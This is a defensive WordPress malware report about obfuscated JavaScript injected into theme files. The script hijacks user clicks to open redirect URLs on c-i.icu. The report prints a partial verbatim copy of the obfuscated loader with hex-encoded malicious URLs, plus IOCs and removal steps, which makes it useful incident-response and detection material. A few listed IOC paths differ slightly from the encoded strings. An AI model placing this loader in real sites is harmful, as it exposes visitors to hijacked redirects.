---
title: 'JavaScript Obfuscation Causing AJAX Malfunction'
slug: 'javascript-obfuscation-ajax-malfunction'
description: 'Detailed analysis on how obfuscated malware in index.php, header.php & functions.php are disrupting AJAX functionality in WordPress.'
reportDate: '2026-02-01'
threatType: 'Malware'
severity: 'High'
fileHash: '7f968372b93a0584865797c351cce3bc994898d485fb7fdc2cea132671dd5d0b'
detectedPaths: ['index.php', 'functions.php', 'header.php']
screenshots:
  ['/images/wordpress-threats/malware-in-themes-index.php_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The impact of this threat is primarily the disruption of AJAX functionality, leading to degradation of front-end performance and potential exposure of user data through unsanctioned redirection. There is also a possibility of broader site compromise if the threat persists across multiple files.'
seenOn: 'WordPress themes'
behavior: 'Obfuscation, Redirection, AJAX disruption'
difficulty: 'Medium'
recurrence: 'High'
numberOfSiteFixed: '3'
---

## Technical Analysis

The obfuscated JavaScript code present in the WordPress theme's index.php, header.php & functions.php files appears to be designed to disrupt AJAX functionality by degrading the usability of scripts and manipulating local storage items. The primary mechanism is a set of encoded function calls (\_0x3023, \_0x10c8) and conditional logic that interfere with normal execution flow.

The script initializes with an obfuscated function responsible for decoding further calls, creating a redirected path for execution. Several URLs are specified in an encoded format, likely used for malicious redirects:

- http://c-i.icu/JHd2c302
- http://c-i.icu/peQ3c303
- http://c-i.icu/FOc0c340
- http://c-i.icu/qi7c367

Events are attached to monitor user interactions and potentially extract or manipulate localStorage data through functions like \_0x978889, which opens random URLs upon user click events if certain conditions are met (e.g., timing intervals stored in localStorage).

Screening the breakdown of the JavaScript gives a hold on how AJAX calls are nullified through stopPropagation and other event control manipulations. This is compounded by unsanctioned redirects that potentially harvest user data or hijack session information.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Obfuscation kicks in, initializing decode functions.
2. URLs are prepared for redirects based on user interaction.
3. localStorage manipulation occurs to track state.
4. AJAX functions are disrupted through event hijacking and malformed conditions.

## Code Signature(s)

### FILE: `index.php, header.php & functions.php`

```php
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x4a\x48\x64\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x70\x65\x51\x33\x63\x303','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x46\x4f\x63\x30\x63\x340','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x71\x79\x65\x37\x63\x367','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x6e\x78\x6b\x36\x63\x386','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x63\x69\x64\x38\x63\x338','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x52\x79\x4d\x35\x63\x355','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x47\x70\x63\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x49\x78\x55\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x2d\x69\x2e\x69\x63\x75\x2f\x78\x59\x58\x39\x63\x379','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac
```

## Indicators of Compromise (IOCs)

- `hxxp://c-i[.]icu/JHd2c302`
- `hxxp://c-i[.]icu/peQ3c303`
- `hxxp://c-i[.]icu/FOc0c340`
- `hxxp://c-i[.]icu/qi7c367`
- `hxxp://c-i[.]icu/cid8c338`
- `hxxp://c-i[.]icu/RyM5c355`
- `hxxp://c-i[.]icu/nxk6c386`
- `hxxp://c-i[.]icu/IxU4c364`
- `hxxp://c-i[.]icu/xYX9c379`
- `hxxp://c-i[.]icu/Gp1c351`

## Removal Protocol

1. Remove the script from the index.php, header.php & functions.php completely.
1. Review other theme files for similar patterns.
1. Update the theme to the latest version from a clean source.
1. Validate all AJAX calls and events in the frontend for legitimate actions.
1. Ensure local storage is not being maliciously manipulated after cleaning.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
